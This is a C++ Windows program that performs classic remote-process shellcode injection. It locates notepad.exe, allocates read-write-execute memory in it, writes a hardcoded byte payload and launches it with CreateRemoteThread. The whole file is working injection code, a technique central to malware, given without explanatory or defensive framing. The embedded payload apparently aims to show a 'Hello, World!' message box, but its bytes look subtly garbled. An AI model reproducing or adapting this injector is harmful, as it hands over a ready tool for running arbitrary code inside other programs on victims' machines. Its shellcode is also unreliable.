#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <iostream>

// Function to get the process ID of the target process
DWORD GetTargetProcessId(const TCHAR* processName) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_tcscmp(pe32.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return 0;
}

int main() {
    const TCHAR* targetProcessName = TEXT("notepad.exe"); // Target process name
    unsigned char payload_bin[] = {
        0x6a, 0x00, 0x68, 0x90, 0x00, 0x68, 0x9e, 0x00, 0x6a, 0x00, 0xe8, 0x08,
        0x00, 0x66, 0xff, 0xd0, 0x6a, 0x00, 0xe8, 0x6f, 0x00, 0x64, 0x66, 0xa1,
        0x30, 0x00, 0x66, 0x67, 0x8b, 0x40, 0x0c, 0x66, 0x67, 0x8b, 0x70, 0x1c,
        0x66, 0xad, 0x66, 0x89, 0xc6, 0x66, 0x67, 0x8b, 0x7e, 0x30, 0x66, 0x67,
        0x8b, 0x47, 0x0c, 0x66, 0x67, 0x8b, 0x78, 0x3c, 0x66, 0x01, 0xc7, 0x66,
        0x67, 0x8b, 0x7f, 0x78, 0x66, 0x01, 0xc7, 0x66, 0x67, 0x8b, 0x4f, 0x18,
        0x66, 0x67, 0x8b, 0x5f, 0x20, 0x66, 0x01, 0xc3, 0x66, 0x49, 0x66, 0x67,
        0x8b, 0x34, 0x8b, 0x66, 0x01, 0xc6, 0x66, 0x67, 0x81, 0x3e, 0x4d, 0x65,
        0x67, 0x41, 0x75, 0xec, 0x66, 0x67, 0x8b, 0x5f, 0x24, 0x66, 0x01, 0xc3,
        0x67, 0x8b, 0x0c, 0x4b, 0x66, 0x67, 0x8b, 0x5f, 0x1c, 0x66, 0x01, 0xc3,
        0x66, 0x67, 0x8b, 0x04, 0x8b, 0x64, 0x66, 0x03, 0x06, 0x30, 0x00, 0xc3,
        0x66, 0xb8, 0x1b, 0xcb, 0x81, 0x7c, 0x66, 0xff, 0xd0, 0x00, 0x00, 0x00,
        0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x2c, 0x20, 0x57, 0x6f, 0x72, 0x6c, 0x64,
        0x21, 0x00, 0x4d, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x00
    };
    unsigned int payload_bin_len = 166;

    DWORD processId = GetTargetProcessId(targetProcessName);
    if (processId == 0) {
        std::cerr << "Could not find target process." << std::endl;
        return 1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        std::cerr << "Could not open target process." << std::endl;
        return 1;
    }

    LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, payload_bin_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pRemoteCode == NULL) {
        std::cerr << "Could not allocate memory in target process." << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    if (!WriteProcessMemory(hProcess, pRemoteCode, payload_bin, payload_bin_len, NULL)) {
        std::cerr << "Could not write to target process memory." << std::endl;
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "Could not create remote thread in target process." << std::endl;
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);

    VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    std::cout << "Shellcode injected successfully." << std::endl;
    return 0;
}